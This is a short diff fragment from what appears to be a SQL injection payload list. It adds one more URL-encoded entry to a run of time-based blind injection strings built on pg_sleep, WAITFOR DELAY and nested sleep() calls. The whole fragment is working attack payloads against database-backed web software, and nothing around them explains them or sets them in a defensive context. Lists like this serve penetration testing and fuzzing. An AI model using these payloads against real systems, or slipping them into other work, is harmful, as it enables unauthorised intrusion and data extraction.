@@ -126,3 +126,4 @@ pg_sleep(5) —-
 ‘;%5waitfor%5delay%5’0:0:5'%5 —- %5
 ‘ WAITFOR DELAY ‘0:0:5’ —-
 (select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
+';%20waitfor%20delay%20'0:0:6'%20--%20
